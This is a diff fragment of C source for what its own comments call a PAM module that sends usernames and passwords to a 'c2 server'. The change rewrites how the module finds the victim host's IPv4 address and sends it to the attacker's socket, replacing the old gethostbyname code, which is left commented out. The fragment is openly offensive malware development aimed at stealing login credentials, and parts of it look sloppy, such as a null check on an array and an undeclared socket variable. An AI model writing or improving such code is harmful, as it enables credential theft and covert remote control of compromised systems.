@@ -26,29 +26,72 @@ typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
 // Function to send data to the c2 server (mainly username:password combinations)
 int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
+
+    char host[256];
+    char ipstr[INET_ADDRSTRLEN + 2];
+    struct addrinfo hints, * res, * p;
+    int status; 
+
+    // Get the hostname
+    gethostname(host, sizeof(host));
+
+    if (host == NULL) {
+        return 1;
+    }
+
+    // Set up the hints structure
+    memset(&hints, 0, sizeof hints);
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+
+    // Get address information
+    status = getaddrinfo(host, NULL, &hints, &res);
+
+    // Loop through all the results and get the first IPv4 address
+    for (p = res; p != NULL; p = p->ai_next) {
+        void* addr = NULL;
+        if (p->ai_family == AF_INET) {
+            struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
+            addr = &(ipv4->sin_addr);
+
+            // Convert the IP to a string
+            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
+            int len = strnlen(ipstr, 16);
+            ipstr[len + 1] = '\0';
+            ipstr[len] = '\n';
+            send(clientSocket, ipstr, strnlen(ipstr, 17), 0);
+
+            // Break after the first IP address is found
+            break;
+        }
+    }
+
+    // Free the linked list
+    freeaddrinfo(res);
+
     // Get host IP address
-    char hostbuffer[256];
-    char* ipaddr;
-    struct hostent *host_entry;
-    int hostname;
+    // char hostbuffer[256];
+    // char* ipaddr;
+    // struct hostent *host_entry;
+    // int hostname;
 
-    // To retrieve hostname
-    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
+    // // To retrieve hostname
+    // hostname = gethostname(hostbuffer, sizeof(hostbuffer));
 
-    if (hostname == -1) {
-        return 1;
-    }
+    // if (hostname == -1) {
+    //     return 1;
+    // }
 
-    // To retrieve host information
-    host_entry = gethostbyname(hostbuffer);
+    // // To retrieve host information
+    // host_entry = gethostbyname(hostbuffer);
 
-    if (host_entry == NULL) {
-        return 1;
-    }
+    // if (host_entry == NULL) {
+    //     return 1;
+    // }
 
-    // To convert an Internet network
-    // address into ASCII string
-    ipaddr = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
+    // // To convert an Internet network
+    // // address into ASCII string
+    // ipaddr = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
 
     // Create socket to connect to c2 server
     int sock = socket(AF_INET, SOCK_STREAM, 0);
